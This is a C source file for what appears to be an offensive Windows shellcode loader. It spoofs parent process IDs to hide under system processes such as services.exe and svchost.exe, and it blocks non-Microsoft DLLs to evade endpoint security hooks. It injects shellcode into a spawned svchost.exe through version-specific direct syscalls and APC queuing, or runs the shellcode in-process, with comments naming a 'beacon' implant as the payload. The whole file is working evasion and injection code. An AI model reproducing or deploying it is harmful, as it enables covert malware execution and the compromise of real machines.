#include <stdio.h>
#include <windows.h>
#include <wtsapi32.h>
#include <tlhelp32.h>
#include <winternl.h>

#include "loader.h"
#include "syscalls.h"

DWORD GetPID(CHAR* ProcName)
{
    // we will start from lower PIDs which are normally system processes
    // so therefore are a better idea to inject into as will probly stay
    // active for longer.

    DWORD PID               = 0;
    HANDLE tProcess         = NULL;
    DWORD dwProcCount       = 0;
    WTS_PROCESS_INFO* pWPIs = NULL;

    if(!WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, NULL, 1, &pWPIs, &dwProcCount))
    {
        // tuff
        printf("WTSEnumerateProcesses fail\n");
        return NULL;
    }

    for(DWORD i = 0; i < dwProcCount; i++)
    {
        if (strcmp(ProcName, pWPIs[i].pProcessName) == 0)
        {
            tProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pWPIs[i].ProcessId);
            if (tProcess)
            {
                return pWPIs[i].ProcessId;
            }
        }
    }

    return NULL;
}

CHAR* GetParentHandle(HANDLE* hProcess)
{
    DWORD Pid, iter;
    HANDLE tProcess;
    CHAR* PreferProcChain[3][2] = {
        { "services.exe", "C:\\windows\\system32\\svchost.exe" },
        { "svchost.exe", "C:\\windows\\system32\\RuntimeBroker.exe" },
        { "sihost.exe", "C:\\windows\\system32\\taskhostw.exe" }
    };

    for (iter = 0; iter < 3; iter++)
    {
        // get PID of parent we want to spoof
        Pid = GetPID(PreferProcChain[iter][0]);
        if (Pid != NULL)
        {
            // use syscall
            tProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
            if (tProcess)
            {
                break;
            }
        }
    }

    *hProcess = tProcess;
    return PreferProcChain[iter][1];
}

void SpawnProcess(HANDLE hProcess, CHAR* ProcessName, HANDLE* cProc, HANDLE* cThread, CHAR* Stage, DWORD sSize)
{
    // our start up info
    SIZE_T attribSize;
    STARTUPINFOEXA sInfo;
    PROCESS_INFORMATION pInfo;

    // zero out our mem just to be safe
    ZeroMemory(&sInfo, sizeof(STARTUPINFOEXA));

    // set up our attributes to expect 2
    InitializeProcThreadAttributeList(NULL, 2, 0, &attribSize);
    sInfo.lpAttributeList = malloc(attribSize);
    InitializeProcThreadAttributeList(sInfo.lpAttributeList, 2, 0, &attribSize);

    // our protection policys
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
                    //  PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;
    UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    // ppid spoof
    UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL);

    // set the size of the struct
    sInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    
    // start the process
    // use syscall
    // spawn svchost.exe with a different ppid an jus start it running
    CreateProcessA(ProcessName, NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);

    // alloc the memory we need inside the process
    LPVOID rBuffer = NULL;
    ULONG oProc, nProc;
    rBuffer = VirtualAllocEx(pInfo.hProcess, NULL, sSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

    OSVERSIONINFOEXW osInfo;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

    RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");

    RtlGetVersion(&osInfo);
    
    // make sure we are using the correct syscall numbers, probly a nicer way of doing this
    if ((osInfo.dwMajorVersion) == 10 && (osInfo.dwMinorVersion == 0))
    {
        NtQueueApcThread     = &NtQueueApcThread10;
        NtWriteVirtualMemory = &NtWriteVirtualMemory10;
    } else if ((osInfo.dwMajorVersion) == 6 && (osInfo.dwMinorVersion == 3))
    {
        NtQueueApcThread     = &NtQueueApcThread81;
        NtWriteVirtualMemory = &NtWriteVirtualMemory81;
    }

    // write our shellcode bytes to the process
    NtWriteVirtualMemory(pInfo.hProcess, rBuffer, Stage, sSize, NULL);

    // change the permisions on the memory so we can execute it
    VirtualProtectEx(pInfo.hProcess, rBuffer, sSize, PAGE_EXECUTE_READWRITE, &oProc);

    // execute the code inside the process
    NtQueueApcThread(pInfo.hThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);

    // give the return values
    *cProc = pInfo.hProcess;
    *cThread = pInfo.hThread;

    return;
}

VOID InjectProcess(HANDLE cProc, HANDLE cThread, CHAR* Stage, DWORD sSize)
{
    ULONG oProc, nProc;
    LPVOID rBuffer = NULL;
    OSVERSIONINFOEXW osInfo;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

    RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");

    RtlGetVersion(&osInfo);

	HANDLE remoteThread;
	PVOID remoteBuffer;

	// remoteBuffer = VirtualAllocEx(cProc, NULL, sSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	// WriteProcessMemory(cProc, remoteBuffer, Stage, sSize, NULL);
	// remoteThread = CreateRemoteThread(cProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	// CloseHandle(cProc);

    remoteBuffer = VirtualAllocEx(cProc, NULL, sSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(cProc, remoteBuffer, Stage, sSize, NULL);
    DWORD dwResult = QueueUserAPC((PAPCFUNC)remoteBuffer, cProc, NULL);

    // alloc the memory we need inside the process
    // rBuffer = VirtualAllocEx(cProc, NULL, sSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // WriteProcessMemory(cProc, rBuffer, Stage, sSize, NULL);

    // DWORD dwResult = QueueUserAPC((PAPCFUNC)rBuffer, cThread, NULL);
    
    // // make sure we are using the correct syscall numbers, probly a nicer way of doing this
    // if ((osInfo.dwMajorVersion) == 10 && (osInfo.dwMinorVersion == 0))
    // {
    //     NtQueueApcThread     = &NtQueueApcThread10;
    //     NtWriteVirtualMemory = &NtWriteVirtualMemory10;
    // } else if ((osInfo.dwMajorVersion) == 6 && (osInfo.dwMinorVersion == 3))
    // {
    //     NtQueueApcThread     = &NtQueueApcThread81;
    //     NtWriteVirtualMemory = &NtWriteVirtualMemory81;
    // }

    // // write our shellcode bytes to the process
    // NtWriteVirtualMemory(cProc, rBuffer, Stage, sSize, NULL);

    // // change the permisions on the memory so we can execute it
    // // VirtualProtectEx(cProc, rBuffer, sSize, PAGE_EXECUTE_READWRITE, &oProc);

    // // execute the code inside the process
    // NtQueueApcThread(cThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
}

VOID ExecuteStage(CHAR* Stage, DWORD sSize)
{
    // execute the stage. If we are in secure mode then lets ppid spoof and launch beacon from there.
    // if we are not then lets drop the shellcode in our current processes.
    HANDLE hProcess;
    CHAR* ChildProcess;
    HANDLE cProc, cThread;

    // if we not running in secure mode then lets just drop the shellcode
    #ifndef SECURE
        // replace this with a syscall
    	void* module = VirtualAlloc(0, sSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	    memcpy(module, Stage, sSize);
	    ((void(*)())module)();
    #endif

    // if we are in secure mode then lets ppid spoof and inject
    #ifdef SECURE
        // get our the new ppid
        ChildProcess = GetParentHandle(&hProcess);

        // spawn the ppid spoofed process
        SpawnProcess(hProcess, ChildProcess, &cProc, &cThread, Stage, sSize);

        // inject the code into the process
        // InjectProcess(cProc, cThread, Stage, sSize);
    
    #endif

    return;
}